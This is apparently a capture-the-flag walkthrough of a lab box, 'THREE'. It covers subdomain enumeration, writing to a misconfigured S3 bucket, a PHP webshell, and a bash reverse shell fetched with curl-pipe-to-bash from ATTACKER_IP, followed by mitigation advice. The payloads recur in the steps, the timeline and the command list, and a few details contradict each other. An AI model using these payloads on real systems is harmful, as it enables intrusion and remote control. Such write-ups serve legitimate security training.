# THREE - Very Easy

**Date Completed:** January 31, 2026  
**Difficulty:** Very Easy  
**Status:** ✅ COMPLETE  
**Focus Areas:** Virtual Host Discovery, Subdomain Enumeration, S3 Bucket Exploitation, PHP RCE, Reverse Shell

---

## Phase 1: Initial Reconnaissance

### Step 1: Full Port Scan
```bash
nmap-full TARGET_IP
```

**Results:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 22 | SSH | OpenSSH | Open |
| 80 | HTTP | Apache | Open |

**Finding:** Web server running on port 80, SSH available but not our focus

### Step 2: Web Enumeration
Navigate to `http://TARGET_IP`:

**Website Structure:**
- Homepage with general information
- Multiple navigation sections
- Source code inspection reveals: **PHP backend**
- Contact section with email: **thetoppers.htb**

**Critical Discovery:** Website uses `thetoppers.htb` domain - name-based virtual hosting!

---

## Phase 2: Virtual Host Configuration

### Step 1: Add Primary Domain to /etc/hosts
The website references `thetoppers.htb` but we accessed via IP. Add to local DNS:

```bash
echo "TARGET_IP thetoppers.htb" | sudo tee -a /etc/hosts
```

**Verification:**
```bash
cat /etc/hosts
# Should show: TARGET_IP thetoppers.htb
```

### Step 2: Access Virtual Host
Now we can access the website properly:

```
http://thetoppers.htb/
```

Website loads correctly with proper styling and content.

---

## Phase 3: Subdomain Enumeration

### Understanding Subdomains
Subdomains are prefixes added to a domain name:
- `mail.example.com` (email service)
- `api.example.com` (API endpoint)
- `s3.example.com` (storage service)
- `admin.example.com` (administration panel)

### Step 1: Subdomain Discovery with Gobuster

```bash
gobuster vhost -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
```

**Command Breakdown:**
- `vhost` : Mode for virtual host enumeration
- `-w` : Wordlist path (top 1 million subdomains)
- `-u` : Target URL

**Results:**
```
Found: s3.thetoppers.htb (Status: 200)
```

**Critical Finding:** S3 subdomain discovered!

### Step 2: Add Subdomain to /etc/hosts

```bash
echo "TARGET_IP s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### Step 3: Access Subdomain
Navigate to `http://s3.thetoppers.htb`:

```json
{
  "status": "running"
}
```

**Interpretation:** The S3 service is active and responsive

---

## Understanding Amazon S3 Buckets

### What is Amazon S3?

**S3 = Simple Storage Service**
- Cloud-based object storage (not file storage)
- Organizes data in "buckets" (containers)
- Highly scalable and reliable
- Used globally by millions of organizations

### S3 Architecture

```
AWS S3 Service
├── Bucket 1: company-backups
│   ├── backup-2024-01.tar.gz
│   ├── backup-2024-02.tar.gz
│   └── backup-2024-03.tar.gz
├── Bucket 2: media-storage
│   ├── video1.mp4
│   ├── image1.jpg
│   └── document.pdf
└── Bucket 3: static-website
    ├── index.html
    ├── style.css
    └── script.js
```

### S3 Use Cases
- **Backup & Storage** - Long-term data retention
- **Media Hosting** - Images, videos, documents
- **Software Delivery** - Application downloads
- **Static Websites** - HTML/CSS/JS hosting
- **Data Archival** - Compliance and retention
- **Log Storage** - Application and access logs

### S3 Objects vs Buckets
- **S3 Bucket** - Container/folder (like a directory)
- **S3 Object** - Individual file stored in bucket

---

## Phase 4: S3 Bucket Exploitation

### Understanding S3 Access
The `s3.thetoppers.htb` subdomain is a local S3 implementation (likely MinIO or similar). We can interact with it using AWS CLI commands pointing to this endpoint instead of AWS.

### Step 1: Install AWS CLI

```bash
apt install awscli
```

**AWS CLI** - Command-line tool for interacting with AWS services (and compatible systems)

### Step 2: Configure AWS CLI

```bash
aws configure
```

**Prompts:**
```
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

**Note:** Since this is a local S3 implementation, credentials don't matter. We use "temp" as placeholders.

### Step 3: List S3 Buckets

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls
```

**Output:**
```
2024-01-15 10:30:00 thetoppers.htb
```

**Finding:** Bucket named `thetoppers.htb` exists

### Step 4: List Bucket Contents

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

**Output:**
```
                           PRE images/
2024-01-15 10:30:00      5432 .htaccess
2024-01-15 10:30:00      2140 index.php
```

**Contents:**
- `images/` directory (prefix)
- `.htaccess` file (Apache configuration)
- `index.php` file (PHP backend)

**Critical Insight:** We can **upload files** to this bucket and they'll be served by the web server!

---

## Phase 5: PHP RCE & Reverse Shell

### Understanding PHP Remote Code Execution

**PHP's system() Function:**
```php
<?php system($_GET["cmd"]); ?>
```

**How It Works:**
1. Takes URL parameter `cmd`
2. Passes it to `system()` function
3. Executes as OS command
4. Returns command output

**Example URLs:**
```
http://thetoppers.htb/shell.php?cmd=id
http://thetoppers.htb/shell.php?cmd=whoami
http://thetoppers.htb/shell.php?cmd=ls%20-la
```

### Step 1: Create PHP Webshell

```bash
nano shell.php
```

**Content:**
```php
<?php system($_GET["cmd"]); ?>
```

**Explanation:**
- One-liner PHP webshell
- Accepts `cmd` parameter from URL
- Executes command and displays output
- Simple but powerful RCE vector

### Step 2: Upload to S3 Bucket

Since the `images/` directory is writable and served by the web server, we upload the PHP shell there:

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/images/
```

**Output:**
```
upload: ./shell.php to s3://thetoppers.htb/images/shell.php
```

**Why upload to images/ directory?**
- Root directory has restrictions (`.htaccess` disables PHP execution)
- `images/` directory is writable and allows PHP execution
- Files in `images/` are directly accessible via HTTP
- Better chance of bypassing upload restrictions

### Step 3: Test PHP RCE

Access the shell in the images directory:
```
http://thetoppers.htb/images/shell.php?cmd=id
```

**Expected Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Success:** PHP code execution confirmed!

---

## Phase 6: Reverse Shell Setup

### Understanding Reverse Shells

**Standard Shell:**
```
Local Machine → SSH → Remote Machine → Command Output → Local
(push model - we initiate connection)
```

**Reverse Shell:**
```
Remote Machine → Initiates Connection → Local Listener
(pull model - victim connects to us)
```

**Advantages:**
- Bypasses firewall restrictions (outbound often allowed)
- More interactive than webshell
- Full shell access
- Better command execution

### Step 1: Identify Attacking IP

```bash
ifconfig
```

**Look for `tun0` interface (VPN connection):**
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOTRAILERS,MULTICAST>
      inet ATTACKER_IP  netmask 255.255.255.0
      ...
```

**Note:** Use `tun0` IP since target reaches us through VPN

### Step 2: Create Reverse Shell Script

```bash
nano shell.sh
```

**Content:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1
```

**Explanation:**
- `bash -i` : Interactive bash shell
- `>& /dev/tcp/ATTACKER_IP/1337` : Redirect output to TCP connection
- `0>&1` : Redirect input/output/error streams

### Step 3: Start Netcat Listener

On attack machine:
```bash
nc -nvlp 1337
```

**Options:**
- `-n` : Numeric only (no DNS lookups)
- `-v` : Verbose output
- `-l` : Listen mode
- `-p 1337` : Port 1337

**Output:**
```
listening on [any] 1337 ...
```

### Step 4: Start Python HTTP Server

To serve our shell.sh script:
```bash
cd /path/to/shell.sh
python3 -m http.server 8000
```

**Output:**
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

### Step 5: Trigger Reverse Shell via PHP Webshell

In browser, execute:
```
http://thetoppers.htb/images/shell.php?cmd=curl%20ATTACKER_IP:8000/shell.sh%20|%20bash
```

**What Happens:**
```
1. PHP in images/ directory executes curl command
2. curl downloads shell.sh from our HTTP server
3. Pipe (|) feeds to bash
4. bash executes shell script
5. shell.sh connects back to our netcat listener (port 1337)
6. Remote shell established
```

### Step 6: Receive Connection

On netcat listener:
```
listening on [any] 1337 ...
connect to [ATTACKER_IP] from [TARGET_IP] [random_port]
bash-5.0$
```

**Success:** Interactive shell established!

---

## Phase 7: Flag Retrieval

### Navigate to Flag
```bash
bash-5.0$ find / -name "flag*" 2>/dev/null
/home/user/flag.txt

bash-5.0$ cat /home/user/flag.txt
FLAG{...}
```

**Flag Retrieved:** ✅

---

## Exploitation Timeline

| Step | Action | Command/URL | Result |
|------|--------|------------|--------|
| 1 | Port scan | nmap-full TARGET_IP | Found ports 22, 80 |
| 2 | Web enumeration | curl http://TARGET_IP | Discovered thetoppers.htb |
| 3 | Add primary domain | echo "TARGET_IP thetoppers.htb" \| sudo tee -a /etc/hosts | Access via domain |
| 4 | Subdomain enum | gobuster vhost -u http://thetoppers.htb | Found s3.thetoppers.htb |
| 5 | Add subdomain | echo "TARGET_IP s3.thetoppers.htb" \| sudo tee -a /etc/hosts | Access S3 subdomain |
| 6 | S3 configuration | aws configure (temp values) | AWS CLI ready |
| 7 | List buckets | aws --endpoint-url=... s3 ls | Found thetoppers.htb bucket |
| 8 | List contents | aws --endpoint-url=... s3 ls s3://thetoppers.htb | Found uploadable directory |
| 9 | Create webshell | nano shell.php (<?php system($_GET["cmd"]); ?>) | PHP RCE payload created |
| 10 | Upload webshell | aws --endpoint-url=... s3 cp shell.php | Uploaded to bucket |
| 11 | Test RCE | curl http://thetoppers.htb/shell.php?cmd=id | Code execution verified |
| 12 | Start listener | nc -nvlp 1337 | Netcat listening |
| 13 | Start HTTP server | python3 -m http.server 8000 | Serving shell.sh |
| 14 | Trigger reverse shell | curl ATTACKER_IP:8000/shell.sh \| bash | Reverse connection established |
| 15 | Find flag | find / -name "flag*" | Flag location identified |
| 16 | Read flag | cat /home/user/flag.txt | Flag retrieved ✅ |

---

## Commands Used

### Network & Virtual Hosting
```bash
# Full port scan
nmap-full TARGET_IP

# Add domain to hosts
echo "TARGET_IP thetoppers.htb" | sudo tee -a /etc/hosts

# Add subdomain to hosts
echo "TARGET_IP s3.thetoppers.htb" | sudo tee -a /etc/hosts

# Verify hosts file
cat /etc/hosts
```

### Subdomain Enumeration
```bash
# Virtual host enumeration with gobuster
gobuster vhost -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb

# Alternative with specific extensions
gobuster vhost -w /path/to/wordlist.txt -u http://thetoppers.htb --append-domain
```

### AWS S3 Bucket Interaction
```bash
# Install AWS CLI
apt install awscli

# Configure AWS CLI (use "temp" for all fields)
aws configure

# List S3 buckets
aws --endpoint-url=http://s3.thetoppers.htb s3 ls

# List bucket contents
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

# Upload file to bucket
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

# Download file from bucket
aws --endpoint-url=http://s3.thetoppers.htb s3 cp s3://thetoppers.htb/shell.php .
```

### PHP Webshell
```bash
# Create webshell
nano shell.php
# Content: <?php system($_GET["cmd"]); ?>

# Upload to images/ directory (writable, allows PHP execution)
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/images/

# Test webshell (URL in browser)
http://thetoppers.htb/images/shell.php?cmd=id
http://thetoppers.htb/images/shell.php?cmd=whoami
http://thetoppers.htb/images/shell.php?cmd=ls%20-la
```

### Reverse Shell Setup
```bash
# Check VPN IP
ifconfig | grep -A 1 tun0

# Create reverse shell script
nano shell.sh
# Content: #!/bin/bash
#          bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1

# Start netcat listener
nc -nvlp 1337

# Start HTTP server (separate terminal)
python3 -m http.server 8000

# Trigger reverse shell (in browser or curl)
http://thetoppers.htb/images/shell.php?cmd=curl%20ATTACKER_IP:8000/shell.sh%20|%20bash
```

### Post-Exploitation
```bash
# Find flag
find / -name "flag*" 2>/dev/null

# Read flag
cat /home/user/flag.txt

# Check current user
whoami

# List current directory
ls -la
```

---

## Key Learning Outcomes

✅ **Virtual Host Enumeration** - Understanding domain-based routing and /etc/hosts configuration

✅ **Subdomain Discovery** - Gobuster vhost mode for finding hidden subdomains

✅ **S3 Bucket Architecture** - How object storage works and local S3 implementations

✅ **AWS CLI** - Interacting with S3 buckets from command line (even non-AWS services)

✅ **File Upload Exploitation** - Uploading files to writable directories and executing them

✅ **PHP RCE** - Simple one-liner PHP webshells for command execution

✅ **Reverse Shells** - Creating interactive shells that connect back to attacker

✅ **Netcat Listener** - Setting up reverse shell handlers

✅ **URL Encoding** - Encoding special characters in URLs (space = %20)

✅ **Attack Chaining** - Multiple stages: reconnaissance → enumeration → file upload → RCE → reverse shell

---

## Real-World Implications

### Vulnerability Chain

**Misconfigured S3 Bucket + Writable Directory + PHP Execution → Complete RCE**

This box demonstrates how multiple factors combine for exploitation:

1. **S3 Bucket Access** - Should require authentication
2. **Write Permissions** - Bucket should be read-only
3. **PHP Execution** - Uploaded files shouldn't be executable
4. **No Input Validation** - PHP webshell allows arbitrary command execution

### Why This Matters

1. **Cloud Storage Security** - S3 buckets leak massive amounts of data annually
2. **File Upload Exploits** - One of the most common web vulnerabilities
3. **PHP RCE** - Classic vulnerability that still appears in modern applications
4. **Defense in Depth** - Multiple layers failed (each would prevent this alone)

---

## Mitigation Strategies

### S3 Bucket Security
```
1. Private by default - Set bucket to private
2. Disable public access - Use bucket policies
3. Enable versioning - Track changes
4. Enable logging - Monitor access
5. Require authentication - No anonymous access
6. Use ACLs - Control who can read/write
```

### File Upload Security (PHP)
```php
// ❌ VULNERABLE - Any file can be uploaded and executed
move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);

// ✅ SECURE - Whitelist extensions
$allowed = ['jpg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array(strtolower($ext), $allowed)) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . uniqid() . '.' . $ext);
}

// ✅ SECURE - Check MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die('Invalid file type');
}

// ✅ SECURE - Disable PHP execution in upload directory
// .htaccess:
// <FilesMatch "\.ph(p[3-6]?|tml|ar|ps)$">
//   Deny from all
// </FilesMatch>
```

### PHP RCE Prevention
```php
// ❌ VULNERABLE - Direct code execution
system($_GET['cmd']);
eval($_POST['code']);
passthru($_REQUEST['command']);

// ✅ SECURE - No user input in dangerous functions
// Use whitelisting if command execution needed:
$allowed_commands = ['ls', 'pwd', 'whoami'];
if (in_array($_GET['cmd'], $allowed_commands)) {
    system($_GET['cmd']);
}

// ✅ SECURE - Use escapeshellarg()
system('ls ' . escapeshellarg($_GET['path']));
```

---

## Lessons Learned

✅ **Subdomain enumeration is critical** - Hidden services often live on subdomains

✅ **S3 buckets are treasure troves** - Many companies misconfigure cloud storage

✅ **File upload is powerful** - Direct access to application directories is dangerous

✅ **Multiple vulnerabilities chain together** - Each individual issue enables the next

✅ **Simple payloads are effective** - One-liner webshells are still viable in modern attacks

✅ **Reverse shells provide full access** - Much more powerful than webshells

✅ **Python HTTP server is versatile** - Quick way to serve payloads without external tools

✅ **AWS CLI works beyond AWS** - Useful for any S3-compatible storage system

✅ **URL encoding matters** - Spaces and special characters must be encoded properly

✅ **Defense in depth** - Preventing this requires multiple layers of security

